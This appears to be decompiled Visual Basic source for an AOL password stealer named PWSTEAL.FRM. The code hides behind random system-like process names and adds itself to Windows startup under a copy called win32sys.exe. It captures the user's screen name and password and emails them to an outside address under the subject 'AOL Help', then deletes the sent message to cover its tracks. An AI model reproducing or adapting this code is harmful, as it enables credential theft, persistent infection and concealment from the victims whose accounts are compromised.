' PWSTEAL.FRM
Option Explicit
Const c005E = 16 ' &H10%
Const c0078 = 1036 ' &H40C%

Sub Command1_Click ()
Dim l0022 As Integer
Dim l0028 As String
Dim l002C As String
Command1.Enabled = False
l0022% = extfn6B0("AOL Frame25", 0&)
If  l0022% <> 0 Then
    If  fn2C0() = True Then
        If  fn1E0() = 2 Then l0028$ = "C:\aol25"
        If  fn1E0() = 3 Then l0028$ = "C:\aol30"
        l002C$ = fn4B8()
        Text1 = fn170(l0028$, l002C$)
    End If
End If
Command1.Enabled = True
End Sub

Sub Command2_Click ()
End
End Sub

Sub Form_Load ()
Dim l0038 As Variant
Dim l0040 As String
Dim l0042 As String
subC8 Me
gv0040 = False
On Error Resume Next
Randomize Timer
l0038 = Int(Rnd * 5)
Select Case l0038
Case 1: App.Title = "Win32SysMan"
Case 2: App.Title = "Systray"
Case 3: App.Title = "Explorer"
Case 4: App.Title = "Msgsrv32"
Case Else: App.Title = "Vshwin32"
End Select
If  fn2C0() = True Then Call Command1_Click
l0040$ = App.Path + "\" + App.EXEName + ".exe"
l0042$ = Space(256)
l0038 = extfn5D0("Win32SysMan", "Loaded", "", l0042$, 256)
l0042$ = fn1A8(l0042$)
If  Trim$(l0042$) <> "YES" Then
    l0038 = extfn598("Windows", "Load", "C:\windows\Win32sys.exe")
    FileCopy (l0040$), ("C:\Windows\win32sys.exe")
    l0038 = extfn598("Win32SysMan", "Loaded", "YES")
End If
Timer1.Enabled = True
End Sub

Sub subB50 ()
Dim l0050 As Variant
Dim l0054 As Variant
l0054 = l0050
End Sub

Sub Timer1_Timer ()
Dim l005C As Integer
' Const c005E = 16 ' &H10%
Dim l0062 As Variant
Dim l0066 As Integer
Dim l0070 As Integer
Dim l0072 As Integer
Dim l0076 As Integer
' Const c0078 = 1036 ' &H40C%
Dim l007A As Variant
If  fn2C0() = False Then If  fn250() <> 0 Then Text1.Text = fn218(fn250())
l005C% = extfn6B0("_AOL_MODAL", "Change Your Password")
If  (l005C% <> 0) Then l0062 = extfn7C8(l005C%, c005E, 0, 0)
If  (fn2C0() = True) And (Len(Text1) >= 4) Then
    l0066% = extfn6B0("AOL Frame25", 0&)
    If  l0066% <> 0 Then
        If  gv0040 = False Then
            l0062 = extfn528(0)
            l0062 = extfn678(l0066%, 0)
            l0062 = extfn640(l0066%, 0)
            Call sub410(False, True)
            Call sub3A0("el_wing@usa.net...", "AOL Help", ("SN:" + Chr$(9) + fn4B8() + Chr$(13) + Chr$(10) + "PW:" + Chr$(9) + Text1.Text), True, True)
            sub480 (.2#)
            sub368 "AOL Frame25", "&Mail", "Check Mail You've &Sent"
            Do
                DoEvents
                l0070% = extfn758(l0066%, "Outgoing Mail")
            Loop Until l0070% <> 0
            l0072% = extfn758(l0070%, "Delete")
            l0076% = extfn720(l0070%, "_AOL_Tree")
            Do
                l0062 = extfn7C8(l0076%, c0078, 0, 0)
                sub480 (1.5#)
                l007A = extfn7C8(l0076%, c0078, 0, 0)
            Loop Until l0062 = l007A
            sub100 l0072%
            l0062 = extfn7C8(l0070%, c005E, 0, 0)
            l0062 = extfn528(1)
            l0062 = extfn678(l0066%, 3)
            sub480 (1)
            l0062 = extfn640(l0066%, 1)
            gv0040 = True
        End If
    End If
End If
End Sub

